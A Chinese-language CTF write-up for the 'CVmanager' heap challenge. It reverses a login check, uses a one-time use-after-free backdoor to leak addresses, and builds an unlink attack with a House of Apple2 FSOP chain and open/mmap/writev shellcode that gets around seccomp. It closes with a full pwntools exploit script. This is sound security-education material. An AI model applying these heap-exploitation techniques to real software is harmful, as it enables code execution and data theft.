---
layout: post
title: "2025 / das / CVmanager"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for CVmanager from das (2025)."
source_folder: "Write-ups/2025/das/CVmanager"
lang: zh-CN
---
{% raw %}
# checksec
![09f7c1af-c08d-43c8-9ad6-2b5b5a49eeff](/assets/ctf/f88840e7689d92e118a3.webp)

# 反编译
`main:`
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(a1, a2, a3);
  login();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 <= 5 )
        break;
      if ( v3 == 666 )
        backdoor();
      else
LABEL_13:
        puts("bad choice!");
    }
    if ( v3 <= 0 )
      goto LABEL_13;
    switch ( v3 )
    {
      case 1:
        add();
        break;
      case 2:
        edit();
        break;
      case 3:
        dele();
        break;
      case 4:
        view();
        break;
      case 5:
        seccomp();
        exit(0);
    }
  }
}
```
main逆向完后如上，中有一个`login()`需要绕过。
## `login()`:
```c
unsigned __int64 login()
{
  char buf[8]; // [rsp+8h] [rbp-28h] BYREF
  _BYTE v2[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Welcome to the CV management system, please login first");
  printf("username:");
  buf[read(0, buf, 8u) - 1] = 0;
  printf("password:");
  v2[read(0, v2, 0x10u) - 1] = 0;
  if ( strcmp(buf, "r00t") || !(unsigned int)base64(v2) )
  {
    puts("\x1B[31merror!!!\x1B[0m");
    exit(0);
  }
  puts("\x1B[32mlogin successfully!\x1B[0m");
  return v3 - __readfsqword(0x28u);
}
```
会校验`username`和`password`，`password`会过`base64()`函数。
`base64()`:
```c
_BOOL8 __fastcall base64(const char *a1)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v8; // [rsp+1Ch] [rbp-54h]
  int v9; // [rsp+20h] [rbp-50h]
  int i; // [rsp+24h] [rbp-4Ch]
  int v11; // [rsp+28h] [rbp-48h]
  int v12; // [rsp+2Ch] [rbp-44h]
  int v13; // [rsp+30h] [rbp-40h]
  int v14; // [rsp+34h] [rbp-3Ch]
  unsigned int v15; // [rsp+3Ch] [rbp-34h]
  char s1[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v17; // [rsp+68h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  v11 = strlen(a1);
  v12 = 4 * ((v11 + 2) / 3);
  v8 = 0;
  v9 = 0;
  while ( v8 < v11 )
  {
    v1 = v8++;
    v13 = a1[v1];
    if ( v8 >= v11 )
    {
      v3 = 0;
    }
    else
    {
      v2 = v8++;
      v3 = a1[v2];
    }
    v14 = v3;
    if ( v8 >= v11 )
    {
      v5 = 0;
    }
    else
    {
      v4 = v8++;
      v5 = a1[v4];
    }
    v15 = (v14 << 8) + (v13 << 16) + v5;
    s1[v9] = a0123456789abcd[(v15 >> 18) & 0x3F];
    s1[v9 + 1] = a0123456789abcd[(v15 >> 12) & 0x3F];
    s1[v9 + 2] = a0123456789abcd[(v15 >> 6) & 0x3F];
    v6 = v9 + 3;
    v9 += 4;
    s1[v6] = a0123456789abcd[v15 & 0x3F];
  }
  for ( i = 0; i < (3 - v11 % 3) % 3; ++i )
    s1[v12 - 1 - i] = 61;
  s1[v12] = 0;
  return strcmp(s1, "s3BPcTsMszo=") == 0;
}
```
该函数负责对接受内容进行base64加密后与密文校验，其加密表在`a0123456789abcd`中（`.bss`段）。
登录如下：
```python
sla(b"username:", b"r00t")
sla(b"password:", b"p9s3w0r6")
```

## `.bss`段数组
通过伪代码中的强制类型转换，与赋值推断结构体；`for`循环检索，推断数组大小，结果如下：
```c
unsigned __int64 add()
{
  int size; // [rsp+0h] [rbp-10h] BYREF
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  for ( i = 0; i <= 15 && index[i].heap; ++i )
    ;
  if ( (unsigned int)i < 0x10 )
  {
    printf("Introduction length:");
    __isoc99_scanf("%d", &size);
    if ( size > 255 && size <= 512 )
    {
      index[i].straddr = &name[i];
      printf("your name:");
      read(0, index[i].straddr, 0x10u);
      index[i].heap = malloc(size);
      index[i].size = size;
    }
  }
  return v3 - __readfsqword(0x28u);
}
```

```c
00000000 struct __fixed memo // sizeof=0x18
00000000 {                                       // XREF: .bss:index/r
00000000     void *straddr;
00000008     void *heap;                         // XREF: add+36/o add+15A/o ...
00000010     int size;                           // XREF: add+17E/o edit+A8/o ...
00000014     // padding byte
00000015     // padding byte
00000016     // padding byte
00000017     // padding byte
00000018 };
```

这里的`name[]`数组中成员，应该是16个`char aaa[16]`数组，这里直接用同大小的`_int128`（0x10bytes）替代。

## uaf（）

```c
unsigned __int64 backdoor()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( flag )
  {
    flag = 0;
    puts("index:");
    __isoc99_scanf("%d", &v1);
    if ( v1 < 0x10 )
    {
      if ( index[v1].heap )
      {
        free(index[v1].heap);
        if ( !strncmp((const char *)index[v1].straddr, "CCTTFFEERR!!", 0xCu) )
          write(1, &index[v1], 8u);
      }
    }
  }
  return v2 - __readfsqword(0x28u);
}
```
程序给了uaf，而且打印了elf地址，解决了pie的问题。

# 攻击思路
程序只给了一次uaf，同时泄露pie，原程序有堆数组，可以直接打`unlink`，直接任意地址写，与任意地址读。
```python
for i in range(9):
    add(0x138, b"CCTTFFEERR!!")

for i in range(7):
    dele(i + 2)

uaf(0)
p.address = uu64(rn(8)[1:8]) - 0x51E0
look("p.address")
view(0)
ru(b"introduction:")

libc.address = uu64(rn(6)) - 0x21ACE0
look("libc.address")

add(0x200, b"CCTTFFEERR!!")

target = p.address + 0x5068
unlink = p64(0) + p64(0x131)
unlink += p64(target - 0x18) + p64(target - 0x10)
unlink = unlink.ljust(0x130, b"\x00")
unlink += p64(0x130)
edit(0, unlink)
dele(1)


def w(addr, data, size):
    edit(
        0,
        p64(0) * 2
        + p64(p.address + 0x51E0)
        + p64(target - 0x18)
        + p64(0x200)
        + p64(p.address + 0x51E0)
        + p64(addr)
        + p64(size),
    )
    edit(1, p64(data))


def r(addr, size):
    edit(
        0,
        p64(0) * 2
        + p64(p.address + 0x51E0)
        + p64(target - 0x18)
        + p64(0x200)
        + p64(addr)
        + p64(addr)
        + p64(size),
    )
    view(1)
```

给了`exit()`同时有沙箱：
![1ee27625-3204-44f0-9e88-2ee1e2ede5ad](/assets/ctf/7bf2aa36bdee3983be33.webp)
这里用`openv+mmap+writev`:
```python
shellcode = shellcraft.amd64.openat(-100, "flag", 0)
shellcode += shellcraft.amd64.mmap(0, 0x100, 1, 1, "rax", 0)
shellcode += f"""
    mov rbx, 0x30
    sub rsp, 16
    mov [rsp], rax
    mov [rsp + 8], rbx
"""
shellcode += shellcraft.amd64.writev(1, "rsp", 1)
shellcode = asm(shellcode)

```
对于栈迁移与执行流控制，通过`apple2  +  getkeyserv_handle+576  +  `setcontext+61。

# exp如下：
```python
from pwncli import *
import sys

context(arch="amd64", os="linux", endian="little")
context.terminal = ["tilix", "--action=session-add-right", "-e"]

file = "/home/qwer/pwn/pwn"
host = "challenge.shc.tf"
port = 31803
p = ELF(file)
libc = ELF("libc.so.6")

if "r" in sys.argv:
    io = remote(host, port)
    log.success("运行模式: 远程 (Remote)")
else:
    io = process(file)
    log.success("运行模式: 本地 (Local)")

if "d" in sys.argv:
    context.log_level = "debug"
    log.success("Debug: 开启 (Debug On)")


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda x, data: io.sendafter(x, data)
sla = lambda x, data: io.sendlineafter(x, data)
r = lambda num=4096: io.recv(num)
rn = lambda num: io.recvn(num)
rl = lambda num=4096: io.recvline(num)
ru = lambda x, drop=False: io.recvuntil(x, drop=drop)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
num2str = lambda x: str(x).encode()
# addr为next处地址
protect_ptr = lambda addr, addr2: (addr >> 3 * 4) ^ addr2
reveal_ptr = lambda addr, next: protect_ptr(addr, next)


def look(expr):
    frame_globals = globals()
    value = eval(expr, frame_globals)
    print(f"\033[1;94m{expr} -> {hex(value)}\033[0m")
    return value


def cmd(num):
    sla(b"Your choice:", num2str(num))


def add(size, name):
    cmd(1)
    sla(b"Introduction length:", num2str(size))
    sla(b"your name:", name)


def edit(idx, size):
    cmd(2)
    sla(b"Which CV do you want to modify:", num2str(idx))
    sla(b"Please briefly introduce yourself:", size)


def dele(idx):
    cmd(3)
    sla(b"Which CV do you want to remove:", num2str(idx))


def view(idx):
    cmd(4)
    sla(b"Which CV do you want to view:", num2str(idx))


def exit():
    cmd(5)


def uaf(idx):
    cmd(666)
    sla(b"index:", num2str(idx))


sla(b"username:", b"r00t")
sla(b"password:", b"p9s3w0r6")
for i in range(9):
    add(0x138, b"CCTTFFEERR!!")

for i in range(7):
    dele(i + 2)

uaf(0)
p.address = uu64(rn(8)[1:8]) - 0x51E0
look("p.address")
view(0)
ru(b"introduction:")

libc.address = uu64(rn(6)) - 0x21ACE0
look("libc.address")

add(0x200, b"CCTTFFEERR!!")

target = p.address + 0x5068
unlink = p64(0) + p64(0x131)
unlink += p64(target - 0x18) + p64(target - 0x10)
unlink = unlink.ljust(0x130, b"\x00")
unlink += p64(0x130)
edit(0, unlink)
dele(1)


def w(addr, data, size):
    edit(
        0,
        p64(0) * 2
        + p64(p.address + 0x51E0)
        + p64(target - 0x18)
        + p64(0x200)
        + p64(p.address + 0x51E0)
        + p64(addr)
        + p64(size),
    )
    edit(1, p64(data))


def r(addr, size):
    edit(
        0,
        p64(0) * 2
        + p64(p.address + 0x51E0)
        + p64(target - 0x18)
        + p64(0x200)
        + p64(addr)
        + p64(addr)
        + p64(size),
    )
    view(1)


r(target + 0x18 * 2, 0x8)
ru(b"name:")
heap = uu64(rn(6)) - 0xDE0
look("heap")

shellcode = shellcraft.amd64.openat(-100, "flag", 0)
shellcode += shellcraft.amd64.mmap(0, 0x100, 1, 1, "rax", 0)
shellcode += f"""
    mov rbx, 0x30
    sub rsp, 16
    mov [rsp], rax
    mov [rsp + 8], rbx
"""
shellcode += shellcraft.amd64.writev(1, "rsp", 1)
shellcode = asm(shellcode)


fake_addr = heap + 0xDE0
setcontext = libc.sym["setcontext"] + 61
getketserv = libc.sym["getkeyserv_handle"] + 576
ret = libc.address + 0x02DB7D
rdi_ret = next(libc.search(asm("pop rdi; ret")))
rsi_ret = next(libc.search(asm("pop rsi; ret")))
rdx_rbx_ret = next(libc.search(asm("pop rdx; pop rbx; ret")))

# 打apple2 overflow。
data = flat(
    {
        0: {
            0x08: fake_addr - 0x10,  # 通过第一个调用设置rdx
            0x10: setcontext,  # 第二个调用，控制rsp等寄存器，push一个栈顶
            0x28: 1,  # 绕过_IO_flush_all_lockp检测
            0x30: [
                rdi_ret,
                fake_addr & (~0xFFF),
                rsi_ret,
                0x4000,
                rdx_rbx_ret,
                7,
                0,
                libc.sym["mprotect"],
                fake_addr + 0x100 + 0x40,
            ],
            0x90: fake_addr + 0x30,  # 控制的rsp
            0x98: ret,  # push的栈顶
            0xA0: fake_addr + 0x100,  # wfile_data
            0xD8: libc.sym["_IO_wfile_jumps"],
        },
        0x100: {
            0x18: 0,
            0x28: getketserv,  # 第一个调用
            0x30: 0,
            0x40: shellcode,
            0xE0: fake_addr+ 0xC0,  
			# 指向第一个调用（fake_addr + 0xC0+0x68 = fake_addr+ 0x128）
        },
    },
    filler="\0",
)
edit(2, data)
w(libc.sym["_IO_list_all"], fake_addr, 0x8)
look("setcontext")
dbg("b *setcontext+61")
exit()


io.interactive()
```

在不同libc中可能需要多一些伪造条件，这里除了roderick师傅说的，需要多写`_IO_write_ptr`为大于0的数。

```
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)    //触发
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}
```

{% endraw %}
